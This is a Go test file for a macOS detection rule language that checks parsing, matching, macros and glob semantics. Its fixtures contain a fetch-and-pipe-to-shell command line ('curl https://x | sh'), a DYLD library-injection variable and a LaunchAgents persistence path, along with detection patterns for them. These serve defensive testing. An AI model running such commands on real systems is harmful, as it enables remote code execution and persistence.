package ql

import (
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/rifqifitriady/ZAAFVesper/pkg/event"
)

func testMacros(t testing.TB) *Macros {
	t.Helper()
	m := NewMacros()
	must := func(err error) {
		if err != nil {
			t.Fatal(err)
		}
	}
	must(m.AddExpr("spawn_process", "evt.name = 'CreateProcess'"))
	must(m.AddExpr("create_file", "evt.name = 'CreateFile'"))
	must(m.AddExpr("spawn_shell", "spawn_process and ps.exe in shells"))
	must(m.AddList("shells", []any{"/bin/sh", "/bin/bash", "/bin/zsh"}))
	must(m.AddList("admin_uids", []any{0, 501}))
	return m
}

func procEvent() *event.Event {
	return &event.Event{
		Seq:  7,
		Name: event.CreateProcess,
		Proc: &event.Proc{
			PID: 4242, PPID: 100, Exe: "/bin/zsh", Name: "zsh",
			Cmdline: "zsh -c curl https://x | sh", Args: []string{"zsh", "-c", "curl https://x | sh"},
			UID: 501, EUID: 0, SigningID: "com.apple.zsh", IsPlatform: true, IsSigned: true,
			Env:       map[string]string{"DYLD_INSERT_LIBRARIES": "/tmp/evil.dylib"},
			Parent:    &event.Proc{PID: 100, Exe: "/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal", Name: "Terminal"},
			Ancestors: []string{"/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal", "/sbin/launchd"},
		},
		Args: map[string]string{"prev_exe": "/usr/bin/login"},
	}
}

func fileEvent() *event.Event {
	return &event.Event{
		Name: event.CreateFile,
		Proc: &event.Proc{PID: 9, Exe: "/usr/bin/curl", Name: "curl", IsSigned: true},
		File: &event.File{Path: "/Users/a/Library/LaunchAgents/Com.Evil.plist", Mode: 0o644},
	}
}

func TestMatchTable(t *testing.T) {
	m := testMacros(t)
	pe, fe := procEvent(), fileEvent()
	bare := &event.Event{Name: event.Mount} // no Proc, no File
	cases := []struct {
		expr string
		ev   *event.Event
		want bool
	}{
		// equality / inequality
		{"evt.name = 'CreateProcess'", pe, true},
		{"evt.name != 'CreateProcess'", pe, false},
		{"ps.exe = '/bin/zsh'", pe, true},
		{"ps.exe = '/BIN/ZSH'", pe, false},
		{"ps.exe != '/bin/bash'", pe, true},
		// integers
		{"ps.pid = 4242", pe, true},
		{"ps.pid != 4242", pe, false},
		{"ps.pid > 4000", pe, true},
		{"ps.pid >= 4242", pe, true},
		{"ps.pid < 4242", pe, false},
		{"ps.pid <= 4242", pe, true},
		{"ps.uid in (0, 501)", pe, true},
		{"ps.uid in admin_uids", pe, true},
		{"ps.euid = -1", pe, false},
		{"evt.seq = 7", pe, true},
		{"file.mode = 420", fe, true},
		// booleans
		{"ps.is_platform", pe, true},
		{"ps.is_platform = true", pe, true},
		{"ps.is_platform != true", pe, false},
		{"ps.is_signed = false", pe, false},
		{"not ps.is_signed", pe, false},
		// in / iin
		{"ps.exe in ('/bin/sh', '/bin/zsh')", pe, true},
		{"ps.exe in ('/bin/sh')", pe, false},
		{"ps.exe in shells", pe, true},
		{"ps.exe iin ('/BIN/ZSH')", pe, true},
		{"ps.name in 'zsh'", pe, true},
		// contains / startswith / endswith (+ case-insensitive, + lists)
		{"ps.cmdline contains 'curl'", pe, true},
		{"ps.cmdline contains 'CURL'", pe, false},
		{"ps.cmdline icontains 'CURL'", pe, true},
		{"ps.cmdline contains ('wget', '| sh')", pe, true},
		{"ps.exe startswith '/bin/'", pe, true},
		{"ps.exe istartswith '/BIN/'", pe, true},
		{"ps.exe endswith 'zsh'", pe, true},
		{"ps.exe iendswith 'ZSH'", pe, true},
		{"ps.exe endswith ('bash', 'fish')", pe, false},
		// globs
		{"file.path matches '/Users/*/Library/LaunchAgents/*.plist'", fe, true},
		{"file.path matches '/Users/*/Library/LaunchAgents/com.*.plist'", fe, false},
		{"file.path imatches '/users/*/library/launchagents/com.*.plist'", fe, true},
		{"file.path imatches ('/Library/LaunchDaemons/*', '/Users/*/Library/LaunchAgents/*')", fe, true},
		{"file.path matches '/Users/?/Library/*'", fe, true},
		{"file.path matches '/Users/??/Library/*'", fe, false},
		{"file.name matches '*.plist'", fe, true},
		// regex (RE2)
		{"ps.cmdline regex 'curl\\s+https?://'", pe, true},
		{"ps.cmdline regex ('^bash', 'wget')", pe, false},
		{`ps.cmdline regex '\| *sh$'`, pe, true},
		// list LHS: any element
		{"ps.args = '-c'", pe, true},
		{"ps.args in ('-x', '-c')", pe, true},
		{"ps.args contains 'https'", pe, true},
		{"ps.ancestors = '/sbin/launchd'", pe, true},
		{"ps.ancestors imatches '*/terminal.app/*'", pe, true},
		{"ps.ancestors = '/usr/bin/sudo'", pe, false},
		// indexed fields
		{"evt.arg[prev_exe] = '/usr/bin/login'", pe, true},
		{"evt.arg[missing] = ''", pe, false},
		{"ps.env[DYLD_INSERT_LIBRARIES] endswith '.dylib'", pe, true},
		{"ps.env['DYLD_INSERT_LIBRARIES'] != ''", pe, true},
		{"ps.parent.env[HOME] != ''", pe, false},
		// parent fields
		{"ps.parent.name = 'Terminal'", pe, true},
		{"ps.parent.pid = ps.ppid", pe, true},
		// functions
		{"base(ps.exe) = 'zsh'", pe, true},
		{"dir(ps.exe) = '/bin'", pe, true},
		{"ext(file.path) = '.plist'", fe, true},
		{"lower(file.name) = 'com.evil.plist'", fe, true},
		{"length(ps.name) = 3", pe, true},
		{"length(ps.args) > 2", pe, true},
		{"base(ps.ancestors) = 'launchd'", pe, true},
		{"lower(base(file.path)) endswith '.plist'", fe, true},
		// field on the right
		{"ps.exe != ps.parent.exe", pe, true},
		{"ps.uid != ps.euid", pe, true},
		{"ps.parent.exe in ps.ancestors", pe, true},
		{"ps.is_signed = ps.is_platform", pe, true},
		// nil semantics: absent field makes every comparison false, including !=
		{"ps.exe != '/bin/zsh'", bare, false},
		{"ps.exe = '/bin/zsh'", bare, false},
		{"ps.pid != 1", bare, false},
		{"file.path != ''", bare, false},
		{"ps.is_signed != true", bare, false},
		{"not ps.exe = '/bin/zsh'", bare, true},
		{"not (ps.exe in ('/bin/zsh'))", bare, true},
		// infix negations on an absent field are false (only prefix not flips)
		{"ps.exe not in ('/bin/zsh')", bare, false},
		{"ps.exe not iin ('/bin/zsh')", bare, false},
		{"ps.exe not contains 'z'", bare, false},
		{"ps.exe not icontains 'z'", bare, false},
		{"ps.exe not startswith '/'", bare, false},
		{"ps.exe not istartswith '/'", bare, false},
		{"ps.exe not endswith 'h'", bare, false},
		{"ps.exe not iendswith 'h'", bare, false},
		{"ps.exe not matches '/tmp/*'", bare, false},
		{"ps.exe not imatches '/tmp/*'", bare, false},
		{"ps.exe not regex '^/tmp'", bare, false},
		{"ps.pid not in (1, 2)", bare, false},
		{"evt.arg[nope] not in ('x')", pe, false},
		{"ps.parent.env[HOME] not contains 'x'", pe, false},
		{"base(ps.exe) not in ('x')", bare, false},
		{"file.path not in shells", bare, false},
		{"not file.path not in shells", bare, true},
		{"ps.parent.exe = ps.exe", bare, false},
		{"base(ps.exe) = ''", bare, false},
		{"ps.exe = ps.parent.exe", &event.Event{Proc: &event.Proc{Exe: "a"}}, false},
		// negation: prefix and infix forms are equivalent
		{"not ps.exe in shells", pe, false},
		{"ps.exe not in shells", pe, false},
		{"ps.exe not in ('/bin/bash')", pe, true},
		{"file.path not imatches '/tmp/*'", fe, true},
		{"ps.exe not startswith '/usr/'", pe, true},
		// precedence: not > and > or
		{"true or false and false", pe, true},
		{"(true or false) and false", pe, false},
		{"not false and false", pe, false},
		{"not (false and false)", pe, true},
		{"false or not false", pe, true},
		{"ps.pid = 1 or ps.pid = 4242 and ps.name = 'zsh'", pe, true},
		{"ps.pid = 1 or ps.pid = 4242 and ps.name = 'bash'", pe, false},
		// macros
		{"spawn_process", pe, true},
		{"spawn_process", fe, false},
		{"spawn_shell", pe, true},
		{"create_file and file.path imatches '*/launchagents/*'", fe, true},
		{"not spawn_process", fe, true},
		// keywords are case-insensitive
		{"ps.pid = 4242 AND ps.exe IN shells", pe, true},
		// multi-line
		{"spawn_process\n  and ps.exe in shells\n  and not ps.is_signed = false", pe, true},
	}
	for _, c := range cases {
		f, err := Compile(c.expr, m)
		if err != nil {
			t.Errorf("Compile(%q): %v", c.expr, err)
			continue
		}
		if got := f.Match(c.ev); got != c.want {
			t.Errorf("%q: got %v, want %v", c.expr, got, c.want)
		}
	}
}

func TestEmptyListLHS(t *testing.T) {
	e := &event.Event{Name: event.CreateProcess, Proc: &event.Proc{}}
	for expr, want := range map[string]bool{
		"ps.args = 'x'":       false,
		"ps.args != 'x'":      false,
		"not ps.args = 'x'":   true,
		"length(ps.args) = 0": true,
	} {
		f, err := Compile(expr, nil)
		if err != nil {
			t.Fatal(err)
		}
		if got := f.Match(e); got != want {
			t.Errorf("%q = %v, want %v", expr, got, want)
		}
	}
}

func TestMatchNilEvent(t *testing.T) {
	f, err := Compile("not ps.pid = 1", nil)
	if err != nil {
		t.Fatal(err)
	}
	if f.Match(nil) {
		t.Fatal("nil event must not match")
	}
}

func TestStringEscapes(t *testing.T) {
	e := &event.Event{Proc: &event.Proc{Cmdline: `echo 'hi' \ there`}}
	f, err := Compile(`ps.cmdline = 'echo \'hi\' \\ there'`, nil)
	if err != nil {
		t.Fatal(err)
	}
	if !f.Match(e) {
		t.Fatal("escaped string did not match")
	}
	// Unknown escapes keep the backslash (handy for regex).
	f, err = Compile(`ps.cmdline regex '\\\\ th\w+'`, nil)
	if err != nil {
		t.Fatal(err)
	}
	if !f.Match(e) {
		t.Fatal("regex with escapes did not match")
	}
}

func TestEventNames(t *testing.T) {
	m := testMacros(t)
	cases := []struct {
		expr string
		want []string
	}{
		{"spawn_process", []string{"CreateProcess"}},
		{"spawn_process and ps.pid = 1", []string{"CreateProcess"}},
		{"spawn_process or create_file", []string{"CreateFile", "CreateProcess"}},
		{"evt.name in ('Fork', 'CreateProcess')", []string{"CreateProcess", "Fork"}},
		{"evt.name iin ('fork')", []string{"Fork"}},
		{"evt.name in ('Fork', 'CreateProcess') and evt.name = 'Fork'", []string{"Fork"}},
		{"evt.name = 'Fork' and evt.name = 'CreateFile'", []string{}},
		{"ps.pid = 1", nil},
		{"spawn_process or ps.pid = 1", nil},
		{"not spawn_process", nil},
		{"evt.name != 'Fork'", nil},
		{"ps.exe not in shells and spawn_process", []string{"CreateProcess"}},
		{"evt.category = 'auth'", []string{"Authenticate", "Sudo"}},
		{"false", []string{}},
	}
	for _, c := range cases {
		f, err := Compile(c.expr, m)
		if err != nil {
			t.Fatalf("Compile(%q): %v", c.expr, err)
		}
		got := f.EventNames()
		if !reflect.DeepEqual(got, c.want) {
			t.Errorf("%q: EventNames = %#v, want %#v", c.expr, got, c.want)
		}
	}
}

func TestCompileErrors(t *testing.T) {
	m := testMacros(t)
	cases := []struct {
		expr    string
		wantMsg string
		line    int
		col     int
	}{
		{"ps.exx = 'a'", "unknown field or macro", 1, 1},
		{"ps.exe = 'a' and ps.foo = 1", "unknown field or macro \"ps.foo\"", 1, 18},
		{"ps.exe = ", "expected a value", 1, 10},
		{"ps.exe 'a'", "unexpected string", 1, 8},
		{"ps.exe = 'a", "unterminated string", 1, 10},
		{"ps.exe = \"a\"", "single quotes", 1, 10},
		{"ps.pid = 'x'", "expected an integer", 1, 10},
		{"ps.exe = 1", "expected a string", 1, 10},
		{"ps.is_signed = 'yes'", "expected true or false", 1, 16},
		{"ps.exe < 'a'", "not defined for string", 1, 1},
		{"ps.is_signed contains 'x'", "not defined for boolean", 1, 1},
		{"ps.exe", "expected an operator", 1, 1},
		{"ps.exe = ('a', 'b')", "does not accept a list", 1, 10},
		{"ps.exe regex '('", "invalid regex", 1, 14},
		{"evt.name = 'CreatProcess'", "unknown event name", 1, 12},
		{"(ps.pid = 1", "expected ')'", 1, 12},
		{"ps.pid = 1)", "unexpected", 1, 11},
		{"ps.pid = 1 and", "expected a condition", 1, 15},
		{"and ps.pid = 1", "unexpected keyword", 1, 1},
		{"ps.exe in shells2", "unknown field or list macro", 1, 11},
		{"ps.exe in spawn_process", "cannot be used as a value", 1, 11},
		{"shells", "cannot be used as a condition", 1, 1},
		{"ps.exe matches ps.parent.exe", "literal pattern", 1, 1},
		{"ps.exe = ps.pid", "cannot compare", 1, 10},
		{"base(ps.pid) = 'x'", "needs a string field", 1, 1},
		{"base(ps.exe, ps.name) = 'x'", "takes one field", 1, 12},
		{"ps.exe[x] = 'a'", "does not accept an index", 1, 1},
		{"evt.arg[] = 'a'", "empty index", 1, 1},
		{"evt.arg[x = 'a'", "unterminated '['", 1, 1},
		{"ps.exe not = 'a'", "not allowed", 1, 12},
		{"ps.pid == 1", "'=='", 1, 8},
		{"ps.exe = 'a' | ps.exe = 'b'", "unexpected character", 1, 14},
		{"", "empty expression", 1, 1},
		{"ps.pid = 1 and\n  ps.nope = 2", "unknown field", 2, 3},
		{"ps.pid = 99999999999999999999", "invalid integer", 1, 10},
	}
	for _, c := range cases {
		_, err := Compile(c.expr, m)
		if err == nil {
			t.Errorf("Compile(%q): expected error", c.expr)
			continue
		}
		if !strings.Contains(err.Error(), c.wantMsg) {
			t.Errorf("Compile(%q): error %q does not contain %q", c.expr, err, c.wantMsg)
		}
		qe, ok := err.(*Error)
		if !ok {
			t.Errorf("Compile(%q): error %T is not *Error", c.expr, err)
			continue
		}
		if qe.Pos.Line != c.line || qe.Pos.Col != c.col {
			t.Errorf("Compile(%q): position %v, want line %d col %d (%v)", c.expr, qe.Pos, c.line, c.col, err)
		}
	}
}

func TestNestingLimit(t *testing.T) {
	deep := strings.Repeat("(", maxNesting+5) + "true" + strings.Repeat(")", maxNesting+5)
	if _, err := Compile(deep, nil); err == nil || !strings.Contains(err.Error(), "nested deeper") {
		t.Fatalf("expected nesting error, got %v", err)
	}
	nots := strings.Repeat("not ", maxNesting+5) + "true"
	if _, err := Compile(nots, nil); err == nil {
		t.Fatal("expected nesting error for not chain")
	}
}

func TestMacroErrors(t *testing.T) {
	m := NewMacros()
	if err := m.AddExpr("a", "b and ps.pid = 1"); err != nil {
		t.Fatal(err)
	}
	if err := m.AddExpr("b", "a"); err != nil {
		t.Fatal(err)
	}
	if _, err := Compile("a", m); err == nil || !strings.Contains(err.Error(), "references itself") {
		t.Fatalf("expected cycle error, got %v", err)
	}
	if err := m.AddExpr("a", "true"); err == nil {
		t.Fatal("duplicate macro accepted")
	}
	for _, bad := range []string{"ps.exe", "and", "Bad-Name", "base"} {
		if err := m.AddExpr(bad, "true"); err == nil {
			t.Errorf("macro name %q accepted", bad)
		}
	}
	if err := m.AddList("mixed", []any{"a", 1}); err == nil {
		t.Fatal("mixed list accepted")
	}
	if err := m.AddList("empty", nil); err == nil {
		t.Fatal("empty list accepted")
	}
	if err := m.Validate(); err == nil {
		t.Fatal("Validate missed the cycle")
	}
	m2 := NewMacros()
	_ = m2.AddExpr("broken", "ps.nope = 1")
	_, err := Compile("broken", m2)
	if err == nil || !strings.Contains(err.Error(), `in macro "broken"`) {
		t.Fatalf("macro error lacks context: %v", err)
	}
}

func TestLoadMacros(t *testing.T) {
	dir := t.TempDir()
	a := filepath.Join(dir, "a.yml")
	b := filepath.Join(dir, "b.yml")
	write := func(p, s string) {
		if err := os.WriteFile(p, []byte(s), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	write(a, `
- macro: spawn_process
  expr: evt.name = 'CreateProcess'
- macro: spawn_shell
  description: a shell starts
  expr: spawn_process and ps.exe in shells
`)
	write(b, `
- list: shells
  items: ['/bin/sh', '/bin/zsh']
- list: ports
  items: [22, 80]
`)
	m, err := LoadMacros(a, b)
	if err != nil {
		t.Fatal(err)
	}
	if got := m.Names(); !reflect.DeepEqual(got, []string{"ports", "shells", "spawn_process", "spawn_shell"}) {
		t.Fatalf("Names = %v", got)
	}
	f, err := Compile("spawn_shell", m)
	if err != nil {
		t.Fatal(err)
	}
	if !f.Match(procEvent()) {
		t.Fatal("spawn_shell did not match")
	}

	write(b, "- list: shells\n  items: ['/bin/sh']\n- macro: x\n  expr: ps.nope = 1\n- macro: y\n  exprr: true\n")
	_, err = LoadMacros(a, b)
	if err == nil {
		t.Fatal("expected error for unknown key")
	}
	write(b, "- list: shells\n  items: ['/bin/sh']\n- macro: x\n  expr: ps.nope = 1\n")
	_, err = LoadMacros(a, b)
	if err == nil || !strings.Contains(err.Error(), `macro "x"`) {
		t.Fatalf("expected macro x error, got %v", err)
	}
	write(b, "")
	if _, err := LoadMacros(b); err != nil {
		t.Fatalf("empty file: %v", err)
	}
	write(b, "- macro: spawn_process\n  expr: 'true'\n")
	if _, err := LoadMacros(a, b); err == nil || !strings.Contains(err.Error(), "already defined") {
		t.Fatalf("expected duplicate error, got %v", err)
	}
}

func TestGlob(t *testing.T) {
	cases := []struct {
		pat, s string
		want   bool
	}{
		{"", "", true},
		{"", "a", false},
		{"*", "", true},
		{"*", "/any/thing", true},
		{"abc", "abc", true},
		{"abc", "abd", false},
		{"/tmp/*", "/tmp/a/b/c", true},
		{"/tmp/*", "/tmpx", false},
		{"*.plist", "/a/b.plist", true},
		{"*.plist", "/a/b.plistx", false},
		{"*Agents*", "/Library/LaunchAgents/x", true},
		{"a?c", "abc", true},
		{"a?c", "ac", false},
		{"a?c", "aéc", true},
		{"a??c", "aéc", false},
		{"*/LaunchAgents/*.plist", "/Users/u/Library/LaunchAgents/x.plist", true},
		{"/Users/*/Library/*/*.plist", "/Users/u/Library/LaunchAgents/x.plist", true},
		{"*a*b*c*", "xxaxxbxxcxx", true},
		{"*a*b*c*", "xxaxxcxxbxx", false},
		{"a*b?d", "aXXbcd", true},
		{"**", "x", true},
		{"*?", "", false},
		{"*??", "é", false},
		// regex and shell metacharacters other than * and ? are literal
		{"/a.b", "/a.b", true},
		{"/a.b", "/axb", false},
		{"a+b", "a+b", true},
		{"a+b", "aab", false},
		{"f(1)", "f(1)", true},
		{"f(1)", "f1", false},
		{"[ab]", "[ab]", true},
		{"[ab]", "a", false},
		{"x$", "x$", true},
		{"x$", "x", false},
		{"^x", "^x", true},
		{"^x", "x", false},
		{`a\b`, `a\b`, true},
		{`a\*`, `a\zz`, true},
		{`a\*`, "a*", false},
		{"*.plist", "x.plistx", false},
		{"(*)", "(a/b)", true},
		{"[*]", "[x]", true},
		{"a.*", "a.b/c", true},
		{"a.*", "ab", false},
		// '*' crosses '/', '?' matches exactly one character including '/'
		{"/Users/*/x", "/Users/a/b/c/x", true},
		{"/a?b", "/a/b", true},
		{"/a?b", "/a//b", false},
		{"/a?b", "/ab", false},
		// anchored at both ends
		{"bin/sh", "/bin/sh", false},
		{"/bin/s", "/bin/sh", false},
		{"/bin/?", "/bin/sh", false},
		{"?bin", "/bin", true},
		{"/b?n/*h", "/bin/zsh", true},
		{"/b?n/*h", "/bin/zshx", false},
	}
	for _, c := range cases {
		if got := compileGlob(c.pat).match(c.s); got != c.want {
			t.Errorf("glob %q on %q = %v, want %v", c.pat, c.s, got, c.want)
		}
		if strings.ContainsAny(c.pat, "*?") {
			if got := wildMatch(c.pat, c.s); got != c.want {
				t.Errorf("wildMatch %q on %q = %v, want %v", c.pat, c.s, got, c.want)
			}
		}
	}
}

func TestCompileField(t *testing.T) {
	pe := procEvent()
	for name, want := range map[string]event.Value{
		"ps.exe":                        "/bin/zsh",
		"evt.arg[prev_exe]":             "/usr/bin/login",
		"base(ps.parent.exe)":           "Terminal",
		"ps.pid":                        int64(4242),
		"ps.env[DYLD_INSERT_LIBRARIES]": "/tmp/evil.dylib",
	} {
		f, err := CompileField(name)
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		if got := f.Value(pe); !reflect.DeepEqual(got, want) {
			t.Errorf("%s = %#v, want %#v", name, got, want)
		}
	}
	for _, bad := range []string{"ps.nope", "ps.exe = 1", "", "1"} {
		if _, err := CompileField(bad); err == nil {
			t.Errorf("CompileField(%q) accepted", bad)
		}
	}
}

func TestASTString(t *testing.T) {
	m := testMacros(t)
	f, err := Compile("spawn_process and not ps.exe not in ('a', 'b') or ps.pid > 3", m)
	if err != nil {
		t.Fatal(err)
	}
	got := f.AST().String()
	want := "((evt.name = 'CreateProcess' and not ps.exe not in ('a', 'b')) or ps.pid > 3)"
	if got != want {
		t.Fatalf("AST = %s\nwant  %s", got, want)
	}
	// The printed form compiles to an equivalent filter.
	if _, err := Compile(got, m); err != nil {
		t.Fatalf("round trip: %v", err)
	}
}

func FuzzParse(f *testing.F) {
	seeds := []string{
		"spawn_process and ps.exe in shells",
		"file.path imatches ('/Users/*/Library/LaunchAgents/*.plist', '/Library/*')",
		"not (ps.pid = 1 or ps.pid >= -2) and evt.arg[x] contains 'y'",
		"base(lower(ps.exe)) regex '^a.*b$'",
		"ps.exe not in shells and length(ps.args) > 3",
		"'unterminated",
		"((((",
		"evt.arg[",
		"ps.env['A'] iendswith ('x', 'y')",
		"evt.name iin ('createprocess')",
	}
	for _, s := range seeds {
		f.Add(s)
	}
	m := testMacros(f)
	f.Fuzz(func(t *testing.T, expr string) {
		flt, err := Compile(expr, m)
		if err != nil {
			if _, ok := err.(*Error); !ok {
				t.Fatalf("error %T is not *Error: %v", err, err)
			}
			return
		}
		// A compiled filter must evaluate without panicking on any event shape.
		flt.Match(procEvent())
		flt.Match(fileEvent())
		flt.Match(&event.Event{})
		_ = flt.EventNames()
		// The printed AST must parse again.
		if _, err := Compile(flt.AST().String(), m); err != nil {
			t.Fatalf("AST %q of %q does not recompile: %v", flt.AST().String(), expr, err)
		}
	})
}
